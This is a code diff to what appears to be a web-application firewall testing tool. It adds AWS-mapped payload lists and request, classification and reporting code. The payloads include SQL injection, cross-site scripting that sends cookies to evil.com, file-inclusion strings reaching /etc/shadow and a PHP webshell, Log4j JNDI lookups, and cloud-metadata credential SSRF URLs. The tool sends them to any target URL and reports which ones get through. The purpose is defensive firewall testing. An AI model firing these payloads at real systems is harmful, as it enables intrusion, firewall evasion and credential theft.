@@ -140,6 +140,139 @@ ATTACK_PAYLOADS = {
     ],
 }
 
+# AWS WAF Managed Rules specific payloads
+# Mapped to AWS WAF rule groups for accurate reporting
+AWS_WAF_PAYLOADS = {
+    "AWS-CRS-Size": [
+        "A" * 8192,
+        "B" * 16384,
+        "param=" + "X" * 10000,
+    ],
+    "AWS-CRS-SQLi": [
+        "' OR 1=1--",
+        "1' WAITFOR DELAY '0:0:15'--",
+        "'; EXEC xp_cmdshell('dir');--",
+        "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+        "' UNION ALL SELECT NULL,NULL,CONCAT(0x717a707071,IFNULL(CAST(schema_name AS CHAR),0x20),0x7162627171) FROM INFORMATION_SCHEMA.SCHEMATA#",
+        "1; UPDATE users SET password='hacked' WHERE username='admin'--",
+        "') OR ('x'='x",
+        "1' AND BENCHMARK(10000000,SHA1('test'))--",
+        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "admin' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+    ],
+    "AWS-CRS-XSS": [
+        '<script>document.location="http://evil.com/?c="+document.cookie</script>',
+        '<img src=1 onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
+        "<details open ontoggle=alert(1)>",
+        '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
+        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+        '<input onfocus=alert(1) autofocus="">',
+        '<marquee onstart=alert(1)>',
+        '<video><source onerror="javascript:alert(1)">',
+        '<isindex type=image src=1 onerror=alert(1)>',
+        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+    ],
+    "AWS-CRS-LFI": [
+        "/proc/self/environ",
+        "php://filter/convert.base64-encode/resource=index.php",
+        "php://input",
+        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+        "/var/log/apache2/access.log",
+        "/var/log/auth.log",
+        "expect://id",
+        "file:///etc/shadow",
+        "/proc/self/fd/0",
+    ],
+    "AWS-CRS-RFI": [
+        "http://evil.com/shell.txt?",
+        "https://raw.githubusercontent.com/test/test/main/shell.php",
+        "ftp://evil.com/pub/shell.txt",
+        "\\\\evil.com\\share\\shell.php",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://100.100.100.200/latest/meta-data/",
+    ],
+    "AWS-BadInputs-Log4j": [
+        "${jndi:ldap://evil.com/a}",
+        "${jndi:rmi://evil.com/a}",
+        "${jndi:dns://evil.com/a}",
+        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}dap://evil.com/a}",
+        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
+        "${j${::-n}di:ldap://evil.com/a}",
+        "${jndi:ldap://127.0.0.1#evil.com:1389/a}",
+        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/a}",
+        "${${lower:${lower:jndi}}:${lower:ldap}://evil.com/a}",
+        "${${upper:jndi}:${upper:ldap}://evil.com/a}",
+    ],
+    "AWS-BadInputs-JavaDeser": [
+        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
+        "aced0005",
+        'O:8:"PHPClass":1:{s:4:"test";s:4:"test";}',
+        "YToxOntzOjQ6InRlc3QiO3M6NDoidGVzdCI7fQ==",
+        "__VIEWSTATE=/wEPDwUKMTAyNjczOTc0Ng==",
+    ],
+    "AWS-BadInputs-SSRF": [
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://169.254.170.2/v2/credentials",
+        "http://[fd00:ec2::254]/latest/meta-data/",
+        "http://instance-data/latest/meta-data/",
+        "http://169.254.169.254/latest/api/token",
+        "http://169.254.169.254/latest/user-data/",
+        "http://169.254.169.254/latest/dynamic/instance-identity/document",
+        "http://2852039166/latest/meta-data/",
+        "http://0xA9FEA9FE/latest/meta-data/",
+        "http://0251.0376.0251.0376/latest/meta-data/",
+        "http://[::ffff:169.254.169.254]/latest/meta-data/",
+    ],
+    "AWS-BotControl-UA": [
+        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+        "Wget/1.21",
+        "curl/7.68.0",
+        "python-requests/2.28.0",
+        "Go-http-client/1.1",
+        "Java/1.8.0_201",
+        "libwww-perl/6.05",
+        "PHP/7.4.3",
+        "sqlmap/1.4",
+        "nikto/2.1.6",
+        "nmap scripting engine",
+        "masscan/1.0",
+        "dirbuster",
+        "gobuster/3.1",
+        "nuclei",
+        "httpx",
+    ],
+    "AWS-RateLimit": [],
+}
+
+# Mapping of AWS WAF rule groups for reporting
+AWS_RULE_GROUP_MAP = {
+    "AWS-CRS-Size": "AWSManagedRulesCommonRuleSet (SizeRestrictions)",
+    "AWS-CRS-SQLi": "AWSManagedRulesSQLiRuleSet",
+    "AWS-CRS-XSS": "AWSManagedRulesCommonRuleSet (CrossSiteScripting)",
+    "AWS-CRS-LFI": "AWSManagedRulesCommonRuleSet (LocalFileInclusion)",
+    "AWS-CRS-RFI": "AWSManagedRulesCommonRuleSet (RemoteFileInclusion)",
+    "AWS-BadInputs-Log4j": "AWSManagedRulesKnownBadInputsRuleSet (Log4JRCE)",
+    "AWS-BadInputs-JavaDeser": "AWSManagedRulesKnownBadInputsRuleSet (JavaDeserialization)",
+    "AWS-BadInputs-SSRF": "AWSManagedRulesAmazonIpReputationList / SSRF",
+    "AWS-BotControl-UA": "AWSManagedRulesBotControlRuleSet",
+    "AWS-RateLimit": "Rate-based Rule",
+    "SQLi": "General SQLi",
+    "XSS": "General XSS",
+    "RCE": "General RCE",
+    "Path Traversal": "General Path Traversal",
+    "Shell Injection": "General Shell Injection",
+    "NoSQL Injection": "General NoSQL Injection",
+    "XXE": "General XXE",
+    "SSTI": "General SSTI",
+    "LDAP Injection": "General LDAP Injection",
+    "CRLF": "General CRLF",
+    "SSI": "General SSI",
+    "Mail Injection": "General Mail Injection",
+}
+
+ALL_PAYLOADS = {**ATTACK_PAYLOADS, **{k: v for k, v in AWS_WAF_PAYLOADS.items() if v}}
+
 
 def encode_payload(payload, encoding):
     if encoding == "plain":
@@ -157,46 +290,67 @@ def encode_payload(payload, encoding):
     return payload
 
 
-def classify_response(status_code, body):
+def classify_response(status_code, body, headers=None):
+    aws_waf_info = {}
+    if headers:
+        for h in ("x-amzn-waf-action", "x-amzn-requestid", "x-amz-cf-id", "server"):
+            if h in headers:
+                aws_waf_info[h] = headers[h]
+
     if status_code == 0:
-        return "error"
+        return "error", aws_waf_info
     if status_code in (403, 406, 429, 493):
-        return "blocked"
+        return "blocked", aws_waf_info
     if status_code >= 500:
-        return "blocked"
+        return "blocked", aws_waf_info
     if body and any(
         word in body.lower()
-        for word in ["blocked", "forbidden", "denied", "waf", "security", "violation", "not acceptable"]
+        for word in ["blocked", "forbidden", "denied", "waf", "security",
+                     "violation", "not acceptable", "request blocked",
+                     "aws waf", "cloudfront"]
     ):
-        return "blocked"
-    return "passed"
+        return "blocked", aws_waf_info
+    return "passed", aws_waf_info
 
 
-@app.route("/")
-def index():
-    return render_template("index.html", categories=ATTACK_PAYLOADS)
+def send_request(url, method, headers, body, timeout):
+    start = time.time()
+    try:
+        if method == "GET":
+            resp = http_requests.get(url, headers=headers, timeout=timeout,
+                                     verify=False, allow_redirects=False)
+        else:
+            resp = http_requests.request(method, url, headers=headers, data=body,
+                                         timeout=timeout, verify=False,
+                                         allow_redirects=False)
+        elapsed = int((time.time() - start) * 1000)
+        resp_body = resp.text[:2000]
+        resp_headers = dict(resp.headers)
+        status, waf_info = classify_response(resp.status_code, resp_body, resp_headers)
+        return {
+            "http_status": resp.status_code,
+            "time": elapsed,
+            "status": status,
+            "waf_info": waf_info,
+        }
+    except http_requests.exceptions.Timeout:
+        elapsed = int((time.time() - start) * 1000)
+        return {"http_status": 0, "time": elapsed, "status": "error",
+                "detail": "timeout", "waf_info": {}}
+    except Exception as e:
+        elapsed = int((time.time() - start) * 1000)
+        return {"http_status": 0, "time": elapsed, "status": "error",
+                "detail": str(e), "waf_info": {}}
 
 
-@app.route("/api/categories")
-def get_categories():
-    return jsonify({cat: len(payloads) for cat, payloads in ATTACK_PAYLOADS.items()})
-
-
-@app.route("/api/test", methods=["POST"])
-def run_single_test():
-    data = request.get_json()
-    target_url = data.get("target_url", "")
-    method = data.get("method", "GET")
-    payload = data.get("payload", "")
-    encoding = data.get("encoding", "plain")
-    injection_point = data.get("injection_point", "body-param")
-    custom_headers = data.get("custom_headers", {})
-    timeout = data.get("timeout", 10)
-
-    encoded_payload = encode_payload(payload, encoding)
+def prepare_request(target_url, injection_point, encoded_payload, custom_headers, is_bot_ua=False):
     headers = dict(custom_headers)
     url = target_url
     body = None
+
+    if is_bot_ua:
+        headers["User-Agent"] = encoded_payload
+        return url, headers, body
 
     if injection_point == "url-param":
         sep = "&" if "?" in url else "?"
@@ -211,22 +365,41 @@ def run_single_test():
         headers["Content-Type"] = "application/x-www-form-urlencoded"
         body = f"test={encoded_payload}"
 
-    start = time.time()
-    try:
-        if method == "GET":
-            resp = http_requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=False)
-        else:
-            resp = http_requests.request(method, url, headers=headers, data=body, timeout=timeout, verify=False, allow_redirects=False)
-        elapsed = int((time.time() - start) * 1000)
-        resp_body = resp.text[:2000]
-        status = classify_response(resp.status_code, resp_body)
-        return jsonify({"http_status": resp.status_code, "time": elapsed, "status": status})
-    except http_requests.exceptions.Timeout:
-        elapsed = int((time.time() - start) * 1000)
-        return jsonify({"http_status": 0, "time": elapsed, "status": "error", "detail": "timeout"})
-    except Exception as e:
-        elapsed = int((time.time() - start) * 1000)
-        return jsonify({"http_status": 0, "time": elapsed, "status": "error", "detail": str(e)})
+    return url, headers, body
+
+
+@app.route("/")
+def index():
+    return render_template("index.html",
+                           categories=ATTACK_PAYLOADS,
+                           aws_categories=AWS_WAF_PAYLOADS,
+                           rule_group_map=AWS_RULE_GROUP_MAP)
+
+
+@app.route("/api/categories")
+def get_categories():
+    result = {cat: len(payloads) for cat, payloads in ATTACK_PAYLOADS.items()}
+    result["__aws__"] = {cat: len(payloads) for cat, payloads in AWS_WAF_PAYLOADS.items()}
+    return jsonify(result)
+
+
+@app.route("/api/test", methods=["POST"])
+def run_single_test():
+    data = request.get_json()
+    target_url = data.get("target_url", "")
+    method = data.get("method", "GET")
+    payload = data.get("payload", "")
+    encoding = data.get("encoding", "plain")
+    injection_point = data.get("injection_point", "body-param")
+    custom_headers = data.get("custom_headers", {})
+    timeout = data.get("timeout", 10)
+
+    encoded_payload = encode_payload(payload, encoding)
+    url, headers, body = prepare_request(target_url, injection_point,
+                                          encoded_payload, custom_headers)
+
+    result = send_request(url, method, headers, body, timeout)
+    return jsonify(result)
 
 
 @app.route("/api/test/batch", methods=["POST"])
@@ -244,73 +417,107 @@ def run_batch_test():
     def generate():
         index = 0
         total = sum(
-            len(ATTACK_PAYLOADS.get(cat, [])) * len(encodings)
+            len(ALL_PAYLOADS.get(cat, [])) * len(encodings)
             for cat in categories
+            if cat != "AWS-RateLimit"
         )
+        rate_limit_count = 0
+        if "AWS-RateLimit" in categories:
+            rate_limit_count = data.get("rate_limit_count", 120)
+            total += rate_limit_count
+
         yield json.dumps({"type": "start", "total": total}) + "\n"
 
         for cat in categories:
-            for payload in ATTACK_PAYLOADS.get(cat, []):
+            if cat == "AWS-RateLimit":
+                continue
+            is_bot_ua = (cat == "AWS-BotControl-UA")
+            for payload in ALL_PAYLOADS.get(cat, []):
                 for enc in encodings:
                     index += 1
-                    encoded_payload = encode_payload(payload, enc)
-                    headers = dict(custom_headers)
-                    url = target_url
-                    body = None
-
-                    if injection_point == "url-param":
-                        sep = "&" if "?" in url else "?"
-                        url = f"{url}{sep}test={encoded_payload}"
-                    elif injection_point == "url-path":
-                        url = url.rstrip("/") + "/" + encoded_payload
-                    elif injection_point == "header":
-                        headers["X-Test"] = encoded_payload
-                    elif injection_point == "cookie":
-                        headers["Cookie"] = f"test={encoded_payload}"
+                    if is_bot_ua:
+                        encoded_payload = payload
                     else:
-                        headers["Content-Type"] = "application/x-www-form-urlencoded"
-                        body = f"test={encoded_payload}"
+                        encoded_payload = encode_payload(payload, enc)
 
-                    start = time.time()
-                    try:
-                        if method == "GET":
-                            resp = http_requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=False)
-                        else:
-                            resp = http_requests.request(method, url, headers=headers, data=body, timeout=timeout, verify=False, allow_redirects=False)
-                        elapsed = int((time.time() - start) * 1000)
-                        resp_body = resp.text[:2000]
-                        status = classify_response(resp.status_code, resp_body)
-                        result = {
-                            "type": "result",
-                            "index": index,
-                            "category": cat,
-                            "payload": payload,
-                            "encoding": enc,
-                            "status": status,
-                            "http_status": resp.status_code,
-                            "time": elapsed,
-                        }
-                    except Exception as e:
-                        elapsed = int((time.time() - start) * 1000)
-                        result = {
-                            "type": "result",
-                            "index": index,
-                            "category": cat,
-                            "payload": payload,
-                            "encoding": enc,
-                            "status": "error",
-                            "http_status": 0,
-                            "time": elapsed,
-                        }
+                    url, headers, body = prepare_request(
+                        target_url, injection_point, encoded_payload,
+                        custom_headers, is_bot_ua=is_bot_ua)
 
+                    resp = send_request(url, method, headers, body, timeout)
+                    result = {
+                        "type": "result",
+                        "index": index,
+                        "category": cat,
+                        "payload": payload[:200],
+                        "encoding": "UA" if is_bot_ua else enc,
+                        "status": resp["status"],
+                        "http_status": resp["http_status"],
+                        "time": resp["time"],
+                        "rule_group": AWS_RULE_GROUP_MAP.get(cat, ""),
+                        "waf_info": resp.get("waf_info", {}),
+                    }
                     yield json.dumps(result) + "\n"
 
                     if delay_ms > 0:
                         time.sleep(delay_ms / 1000.0)
 
+        if "AWS-RateLimit" in categories and rate_limit_count > 0:
+            rate_delay = data.get("rate_limit_delay", 50)
+            for i in range(rate_limit_count):
+                index += 1
+                url, headers, body = prepare_request(
+                    target_url, injection_point, "", custom_headers)
+                resp = send_request(url, method, headers, body, timeout)
+                result = {
+                    "type": "result",
+                    "index": index,
+                    "category": "AWS-RateLimit",
+                    "payload": f"Request #{i + 1}",
+                    "encoding": "none",
+                    "status": resp["status"],
+                    "http_status": resp["http_status"],
+                    "time": resp["time"],
+                    "rule_group": "Rate-based Rule",
+                    "waf_info": resp.get("waf_info", {}),
+                }
+                yield json.dumps(result) + "\n"
+                if rate_delay > 0:
+                    time.sleep(rate_delay / 1000.0)
+
         yield json.dumps({"type": "done"}) + "\n"
 
     return Response(generate(), mimetype="application/x-ndjson")
+
+
+@app.route("/api/report", methods=["POST"])
+def generate_report():
+    data = request.get_json()
+    results = data.get("results", [])
+
+    rule_group_stats = {}
+    for r in results:
+        rg = r.get("rule_group") or AWS_RULE_GROUP_MAP.get(r.get("category", ""), "Other")
+        if rg not in rule_group_stats:
+            rule_group_stats[rg] = {"blocked": 0, "passed": 0, "error": 0, "total": 0}
+        rule_group_stats[rg]["total"] += 1
+        rule_group_stats[rg][r.get("status", "error")] += 1
+
+    total = len(results)
+    blocked = sum(1 for r in results if r.get("status") == "blocked")
+    passed = sum(1 for r in results if r.get("status") == "passed")
+
+    report = {
+        "summary": {
+            "total": total,
+            "blocked": blocked,
+            "passed": passed,
+            "block_rate": round(blocked / total * 100, 1) if total > 0 else 0,
+        },
+        "rule_groups": rule_group_stats,
+        "passed_details": [r for r in results if r.get("status") == "passed"],
+    }
+    return jsonify(report)
 
 
 if __name__ == "__main__":
